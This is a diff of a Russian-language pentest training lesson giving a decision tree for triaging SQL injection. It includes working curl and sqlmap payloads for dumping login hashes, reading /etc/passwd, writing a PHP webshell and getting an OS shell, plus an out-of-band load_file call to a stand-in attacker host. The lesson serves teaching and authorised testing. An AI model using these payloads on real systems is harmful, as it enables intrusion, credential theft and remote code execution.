@@ -15,74 +15,55 @@ estimated_minutes: 38
 summary: "Decision-tree для возможной инъекции: подтвердить → определить СУБД → выбрать технику (union/error/blind/OOB) → извлечь данные → эскалировать до файлов и RCE."
 ---
 
-Вы заметили признак инъекции: одиночная кавычка дала ошибку, ответ изменился на `AND 1=1`, страница «зависла» на время. Дальше — самый частый ступор: **это точно SQLi? какая СУБД? какую технику брать? и как из «нашёл» получить дамп или код?** Этот плейбук — дерево решений для всех инъекций (SQL/NoSQL/LDAP/XPath): на каждом узле конкретная команда и условие перехода.
+## Задача
 
-## Дерево решения (общая карта)
+Ты заметил признак инъекции на `https://target.tld/item?id=1`: одиночная кавычка дала ошибку, ответ изменился на `AND 1=1`, страница «зависла» на время. Дальше — самый частый ступор: **это точно SQLi? какая СУБД? какую технику брать? и как из «нашёл» получить дамп или код?**
+
+Этот плейбук — дерево решений для всех инъекций (SQL/NoSQL/LDAP/XPath). На каждом узле — конкретная команда и условие перехода.
+
+## Данные, с которыми работаем
+
+Параметр `id` на `https://target.tld/item`. Пройдём: confirm → fingerprint → техника → extract → escalate.
+
+## Дерево решения
 
 ```
 [признак инъекции]
-   │
    ├─(1) CONFIRM: воспроизвести детерминированно (не один раз!)
-   │      │
-   │      ├─ ошибка СУБД ──────────────► error-based (3)
-   │      ├─ ответ изменился на AND 1=1/1=2 ─► boolean (3)
-   │      ├─ задержка от SLEEP/pg_sleep ─────► time-based (3)
-   │      └─ ничего не видно, но что-то есть ─► OOB (3)
-   │
-   ├─(2) FINGERPRINT: какая СУБД и какая ОС
-   │      │
-   │      └─ MySQL / PostgreSQL / MSSQL / Oracle / SQLite ─► профильная ветка
-   │
+   │      ├─ ошибка СУБД ──────────► error-based
+   │      ├─ AND 1=1 / 1=2 различаются ─► boolean
+   │      ├─ задержка от SLEEP ──────► time-based
+   │      └─ ничего не видно ────────► OOB
+   ├─(2) FINGERPRINT: MySQL / PostgreSQL / MSSQL / Oracle / SQLite
    ├─(3) ТЕХНИКА: union / error / boolean / time / OOB
-   │      │
-   │      └─ выбрал рабочую ──► (4) извлечение
-   │
-   ├─(4) EXTRACT: версия → текущая БД → таблицы → колонки → данные
-   │
-   └─(5) ESCALATE: файл-чтение/запись → RCE
-          │
-          └─► [данные / код / доступ]
+   ├─(4) EXTRACT: версия → БД → таблицы → колонки → данные
+   └─(5) ESCALATE: файл-чтение/запись → RCE  ──► [данные / код]
 ```
 
-## Шаг 1. Confirm: воспроизвести детерминированно
+## Шаг 1: confirm — воспроизвести детерминированно
 
-Одна ошибка на один запрос ничего не значит — может быть случайный шум. Нужна **воспроизводимость**.
+Одна ошибка на один запрос ничего не значит — может быть шум. Нужна **воспроизводимость**:
 
 ```bash
-# Базовая точка отсчёта
-curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download} t=%{time_total}\n' \
-  --get --data-urlencode 'id=1' https://target.tld/item
-
-# Пары «истина/ложь» — детерминированное изменение ответа
-curl -s -o /dev/null -w 'TRUE  size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=1" https://target.tld/item
-curl -s -o /dev/null -w 'FALSE size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=2" https://target.tld/item
-
-# Кавычка/скобки — на ошибку синтаксиса
-for p in "'" "\"" "')" "'))" "';" "%27"; do
-  curl -s --get --data-urlencode "id=1$p" https://target.tld/item \
-    | grep -ioE 'sql syntax|syntax error|ORA-[0-9]+|SQLite|postgres|mysql|unclosed' | head -1
-done
+$ curl -s -o /dev/null -w 'size=%{size_download}\n' --get --data-urlencode 'id=1' https://target.tld/item
+size=4821
+$ curl -s -o /dev/null -w 'TRUE  size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=1" https://target.tld/item
+TRUE  size=4821
+$ curl -s -o /dev/null -w 'FALSE size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=2" https://target.tld/item
+FALSE size=0
 ```
 
-**Условие ветвления:** если `AND 1=1` и `AND 1=2` дают **стабильно разный** ответ — boolean-инъекция подтверждена. Если кавычка даёт **разную** ошибку синтаксиса — тоже подтверждено. Если разницы нет ни в чём — инъекция не подтверждена, вернитесь к параметр-разведке.
+`AND 1=1` и `AND 1=2` дают **стабильно разный** ответ — boolean-инъекция подтверждена.
 
-**Важно про контекст:** инъекция в JSON (`{"id":1}`), в cookie, в заголовке, в multipart ведёт себя иначе, чем в query. Сначала определите, где именно вы вставляете значение.
+**Про контекст:** инъекция в JSON (`{"id":1}`), cookie, заголовке или multipart ведёт себя иначе, чем в query. Сначала определи, где именно ты вставляешь значение.
 
-## Шаг 2. Fingerprint: какая СУБД
+## Шаг 2: fingerprint — какая СУБД
 
-От СУБД зависит всё: синтаксис, функции задержки, способ чтения файлов и RCE.
+От СУБД зависит всё: синтаксис, функция задержки, чтение файлов и RCE.
 
 ```bash
-# Ошибка обычно сама называет СУБД — соберите её текст
-curl -s --get --data-urlencode "id=1'" https://target.tld/item | grep -iE 'mysql|maria|postgres|mssql|oracle|sqlite|odbc'
-
-# Версия через конкатенацию (MySQL) / || (Postgres/Oracle) / + (MSSQL)
-curl -s --get --data-urlencode "id=1 UNION SELECT @@version,2-- -" https://target.tld/item
-curl -s --get --data-urlencode "id=1 UNION SELECT version(),2-- -" https://target.tld/item
-curl -s --get --data-urlencode "id=1 UNION SELECT @@VERSION,2-- -" https://target.tld/item
-
-# sqlmap сам определит СУБД (безопасный «баннер»-запуск)
-sqlmap -u 'https://target.tld/item?id=1' --batch --banner --level 2 --risk 1
+$ curl -s --get --data-urlencode "id=1'" https://target.tld/item | grep -iE 'mysql|postgres|mssql|oracle|sqlite'
+You have an error in your SQL syntax; ... near ''1'' at line 1
 ```
 
 Таблица признаков:
@@ -92,119 +73,126 @@ sqlmap -u 'https://target.tld/item?id=1' --batch --banner --level 2 --risk 1
 | `You have an error in your SQL syntax` | MySQL/MariaDB | `SLEEP(n)` |
 | `ERROR: syntax error at or near` | PostgreSQL | `pg_sleep(n)` |
 | `Unclosed quotation mark after ...` | MSSQL | `WAITFOR DELAY '0:0:5'` |
-| `ORA-01756: quoted string not properly terminated` | Oracle | `dbms_pipe.receive_message` |
+| `ORA-01756: quoted string ...` | Oracle | `dbms_pipe.receive_message` |
 | `SQLite3::...` / `near "...": syntax error` | SQLite | тяжёлый запрос / `randomblob` |
 
-**Условие ветвления:** СУБД известна → берите её профильный урок (`db-mysql`, `db-postgresql`, `db-mssql`, `db-oracle`, `db-sqlite`) и технику из шага 3. Неизвестна → `sqlmap --fingerprint`.
+**Условие ветвления:** СУБД известна → бери её профильный урок (`db-mysql`, `db-postgresql`, `db-mssql`…) и технику из шага 3. Неизвестна → `sqlmap --fingerprint`.
 
-## Шаг 3. Техника: union / error / boolean / time / OOB
+## Шаг 3: техника — union / error / boolean / time / OOB
 
-Выбирайте **по тому, что вы реально видите**, а не по принципу «union круче».
+Выбирай **по тому, что реально видишь**, а не по принципу «union круче».
 
-| Техника | Когда брать | Условие успеха | Команда-заготовка |
-|---------|-------------|----------------|-------------------|
-| **UNION** | ответ выводит данные запроса на страницу | число колонок совпадает | `... UNION SELECT 1,2,3-- -` |
-| **Error** | ошибки СУБД видны в ответе | можно заставить ошибку с данными | `extractvalue(1,concat(0x7e,version()))` |
-| **Boolean** | ответ «есть/нет», различается по размеру | есть стабильная разница | `... AND substr(database(),1,1)='a'` |
-| **Time** | ответ вообще не меняется | задержка воспроизводится | `... AND SLEEP(5)-- -` |
-| **OOB** | нет ни данных, ни разницы, ни времени | сервер может слать DNS/HTTP наружу | `load_file('\\\\attacker.tld\\a')` / `UTL_HTTP` |
+| Техника | Когда брать | Команда-заготовка |
+|---------|-------------|-------------------|
+| **UNION** | данные запроса выводятся на страницу | `... UNION SELECT 1,2,3-- -` |
+| **Error** | ошибки СУБД видны в ответе | `extractvalue(1,concat(0x7e,version()))` |
+| **Boolean** | ответ «есть/нет», различается по размеру | `... AND substr(database(),1,1)='a'` |
+| **Time** | ответ вообще не меняется | `... AND SLEEP(5)-- -` |
+| **OOB** | нет ни данных, ни разницы, ни времени | `load_file('\\\\attacker.tld\\a')` |
 
 ```bash
 # UNION: сначала число колонок через ORDER BY
-for n in 1 2 3 4 5 6; do
-  curl -s -o /dev/null -w "cols=$n code=%{http_code}\n" \
-    --get --data-urlencode "id=1 ORDER BY $n" https://target.tld/item
-done
-# на первой ошибке (n) — колонок (n-1); затем находим «печатающуюся» колонку
-curl -s --get --data-urlencode "id=-1 UNION SELECT 1,2,3-- -" https://target.tld/item
+$ curl -s --get --data-urlencode "id=1 ORDER BY 4" https://target.tld/item | wc -c
+0                       # на 4-й колонке ошибка -> колонок 3
+$ curl -s --get --data-urlencode "id=-1 UNION SELECT 1,2,3-- -" https://target.tld/item
 
-# Error-based (MySQL): версия прямо в ошибке
-curl -s --get --data-urlencode "id=1 AND extractvalue(1,concat(0x7e,version()))-- -" https://target.tld/item
-
-# Boolean (побитовое извлечение) — по символу
-curl -s --get --data-urlencode "id=1 AND ascii(substr((SELECT database()),1,1))>100-- -" https://target.tld/item
-
-# Time (MySQL) — надёжный признак даже вслепую
-time curl -s -o /dev/null --get --data-urlencode "id=1 AND IF(1=1,SLEEP(5),0)-- -" https://target.tld/item
+# Time-based (MySQL) — надёжный признак вслепую
+$ time curl -s -o /dev/null --get --data-urlencode "id=1 AND IF(1=1,SLEEP(5),0)-- -" https://target.tld/item
+real    0m5.02s
 ```
 
-**Условие ветвления:** нашли рабочую технику → шаг 4. UNION не сработал (число колонок/тип) → пробуйте error, затем boolean, затем time. Ничего → OOB или признайте, что точка неинъекционна.
+**Условие ветвления:** нашёл рабочую технику → шаг 4. UNION не сработал → пробуй error, затем boolean, затем time. Ничего → OOB или точка неинъекционна.
 
-## Шаг 4. Extract: от версии к данным
+## Шаг 4: extract — от версии к данным
 
-Порядок всегда один: **версия → текущая БД → таблицы → колонки → строки**. Не пытайтесь сразу `--dump-all`.
+Порядок всегда один: **версия → текущая БД → таблицы → колонки → строки**. Не пытайся сразу `--dump-all`.
 
 ```bash
-# Ручной UNION-дамп (MySQL): все таблицы текущей БД в одну строку
-curl -s --get --data-urlencode \
+# Ручной UNION-дамп (MySQL): таблицы текущей БД
+$ curl -s --get --data-urlencode \
   "id=-1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -" \
   https://target.tld/item
-
-# Колонки конкретной таблицы
-curl -s --get --data-urlencode \
-  "id=-1 UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -" \
-  https://target.tld/item
+users,orders,products
 
 # Строки (логины/хеши)
-curl -s --get --data-urlencode \
+$ curl -s --get --data-urlencode \
   "id=-1 UNION SELECT group_concat(login,0x3a,password SEPARATOR 0x0a),2,3 FROM users-- -" \
   https://target.tld/item
+admin:5f4dcc3b5aa765d61d8327deb882cf99
 
-# Автоматизация (когда рука устала)
-sqlmap -u 'https://target.tld/item?id=1' --batch --dbs
-sqlmap -u 'https://target.tld/item?id=1' --batch -D appdb --tables
-sqlmap -u 'https://target.tld/item?id=1' --batch -D appdb -T users -C login,password --dump
+# Автоматизация
+$ sqlmap -u 'https://target.tld/item?id=1' --batch -D appdb -T users -C login,password --dump
 ```
 
-**Условие ветвления:** получили креды → проверьте их на других сервисах и в `web-playbook-auth-bypass`. Получили чувствительные данные → это уже подтверждённая находка (фиксируйте доказательство).
+**Условие ветвления:** получил креды → проверь их на других сервисах и в auth-плейбуке. Получил чувствительные данные → это подтверждённая находка, фиксируй доказательство.
 
-## Шаг 5. Escalate: файлы и RCE
+## Шаг 5: escalate — файлы и RCE
 
 Инъекция в БД — это не только данные. Часто она даёт чтение/запись файлов и код.
 
 ```bash
 # Чтение файла (MySQL, при FILE-привилегии)
-curl -s --get --data-urlencode "id=-1 UNION SELECT load_file('/etc/passwd'),2,3-- -" https://target.tld/item
+$ curl -s --get --data-urlencode "id=-1 UNION SELECT load_file('/etc/passwd'),2,3-- -" https://target.tld/item
 
-# Запись webshell (MySQL, нужен FILE + writable webroot + secure_file_priv='')
-#   INTO OUTFILE требует, чтобы файл ещё не существовал
-curl -s --get --data-urlencode \
+# Запись webshell (MySQL: FILE + writable webroot + secure_file_priv='')
+$ curl -s --get --data-urlencode \
   "id=-1 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -" \
   https://target.tld/item
-curl -s 'https://target.tld/s.php?0=id'
+$ curl -s 'https://target.tld/s.php?0=id'
 
 # PostgreSQL: COPY ... TO/FROM PROGRAM = прямой RCE
-sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell --technique=U
-
-# MSSQL: включить и использовать xp_cmdshell
-sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell
+$ sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell --technique=U
 ```
 
-**Условие ветвления:** `load_file` работает → ищите конфиги с кредами (`/var/www/.env`, `/etc/mysql/my.cnf`). `INTO OUTFILE` работает → webshell → `id`. `--os-shell` работает → стабилизируйте доступ (обратный шелл/туннель), не «стреляйте» по одному запросу многократно.
+**Осторожно:** `INTO OUTFILE`, `COPY ... PROGRAM`, `xp_cmdshell`, `--os-shell` **меняют состояние** цели. На проде сначала согласуй; пиши webshell в отдельный файл, не перезаписывай существующие, не выполняй деструктивных команд.
 
-**Осторожно:** `INTO OUTFILE`, `COPY ... PROGRAM`, `xp_cmdshell`, `--os-shell` **меняют состояние** цели. На продакшене сначала согласуйте; пишите webshell в отдельный файл, не перезаписывайте существующие; не выполняйте деструктивных команд.
+## Полный прогон от начала до конца
+
+1. `id=1 AND 1=1` vs `1=2` → boolean подтверждён.
+2. Ошибка назвала MySQL → fingerprint.
+3. `ORDER BY 4` → 3 колонки; `UNION SELECT 1,2,3`.
+4. Дамп таблиц → `users` → `admin:5f4dcc...`.
+5. `load_file('/etc/passwd')` → чтение файла → эскалация.
 
 ## Если не сработало — пробуй это
 
-- **UNION не сходится.** Проверьте число колонок через `ORDER BY`, тип (`NULL` вместо числа/строки), комментарий под СУБД (`-- -` vs `#` vs `/* */`).
-- **Фильтр режет кавычку/пробел.** `/**/` вместо пробела, `%0a`, `%09`, `char(39)` вместо `'`, `0x...` вместо строк, регистр (`SeLeCt`), двойное URL-encoding.
-- **Boolean «плывёт».** Динамический контент (реклама/время) меняет размер — сравнивайте не полный размер, а наличие конкретного маркера, либо переходите на time-based.
-- **Time нестабилен.** Увеличьте `--time-sec`, сделайте несколько замеров, вычтите базовую задержку.
-- **Всё вслепую и без OOB.** Попробуйте инъекцию в другие поля (cookie, `User-Agent`, `X-Forwarded-For`, `Referer`) — они часто логируются в БД, которую вы потом читаете.
-- **NoSQL/LDAP/XPath.** Признак: JSON-параметр или `filter=(...)`. Пробуйте `{"$ne":null}`, `*)(|(cn=*`, `' or '1'='1` в XPath. Профиль: `web-nosql-injection`, `web-ldap-injection`, `web-xpath-injection`.
+- **UNION не сходится.** Проверь число колонок (`ORDER BY`), тип (`NULL` вместо числа), комментарий под СУБД (`-- -` vs `#` vs `/* */`).
+- **Фильтр режет кавычку/пробел.** `/**/` вместо пробела, `%0a`, `char(39)` вместо `'`, `0x...` вместо строк, регистр `SeLeCt`.
+- **Boolean «плывёт».** Динамический контент меняет размер — сравнивай конкретный маркер или переходи на time-based.
+- **Time нестабилен.** Сделай несколько замеров, вычти базовую задержку.
+- **Всё вслепую.** Попробуй инъекцию в другие поля (cookie, `User-Agent`, `X-Forwarded-For`) — они часто логируются в БД.
+- **NoSQL/LDAP/XPath.** Признак: JSON-параметр или `filter=(...)`. Пробуй `{"$ne":null}`, `*)(|(cn=*`.
 
-## Тупики (dead ends)
+## Тупики
 
-- Гонять `sqlmap --dump-all --level 5 --risk 3` с ходу — долго, шумно, часто ломает сессию. Сначала ручное подтверждение и узкий дамп.
-- Считать, что «UNION не сработал = нет SQLi». Boolean/time/OOB остаются.
-- Игнорировать, что параметр попадает в **другой** контекст (заголовок/логи) — там инъекция может быть, даже если в `id` её нет.
-- `INTO OUTFILE` в существующий файл — ошибка, ничего не запишется; и без `secure_file_priv` — тоже.
-- Трактовать «задержку» как time-based без контроля: сеть, GC, кэш тоже дают задержку — нужен повтор и контрольная точка.
+- `sqlmap --dump-all --level 5 --risk 3` с ходу — долго, шумно, ломает сессию.
+- «UNION не сработал = нет SQLi» — boolean/time/OOB остаются.
+- Игнорировать другой контекст (заголовок/логи) — там инъекция может быть.
+- `INTO OUTFILE` в существующий файл или без `secure_file_priv` — ничего не запишется.
+- Трактовать «задержку» как time-based без контроля — сеть и GC тоже дают задержку.
+
+## Что мы теперь знаем
+
+- Инъекция подтверждается **детерминированно**, а не одним запросом.
+- СУБД определяется по тексту ошибки; от неё зависит всё.
+- Технику выбирают по тому, что видно: union → error → boolean → time → OOB.
+- Порядок извлечения: версия → БД → таблицы → колонки → данные.
+- Инъекция в БД может эскалировать до чтения файлов и RCE.
+
+## На что смотреть дальше
+
+- **Права СУБД.** `load_file`/`INTO OUTFILE` требуют FILE; `xp_cmdshell` — `sysadmin`.
+- **Не деструктивно.** Webshell в отдельный файл; никаких `DROP`/`rm`.
+- **Параметризованные запросы.** Понимание триажа объясняет, почему prepared statements закрывают класс.
+- **Другой контекст.** Один и тот же ввод в JSON/cookie/заголовке ведёт себя иначе.
+- **OOB-канал.** Collaborator/interactsh для слепых точек без времени.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Ответ на ' AND 1=1 и ' AND 1=2 отличается стабильно. Что это за техника?"
+- question: "Ответ на id=1 AND 1=1 и id=1 AND 1=2 отличается стабильно. Что это за техника?"
   options:
     - "UNION-based"
     - "Boolean-based blind"
@@ -245,6 +233,10 @@ sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell
   answer: 1
   explanation: "Запись файла требует FILE-привилегии, права писать в webroot и отсутствия файла-цели."
 ```
+
+## Куда дальше
+
+Дальше (`web-playbooks-exploit`) мы разберём плейбуки эксплуатации: доступ, файлы и SSRF. А пока главное запомни: триаж — это дерево, где техника выбирается по тому, что ты видишь, а не по принципу «union круче».
 
 ## Где пригодится
 
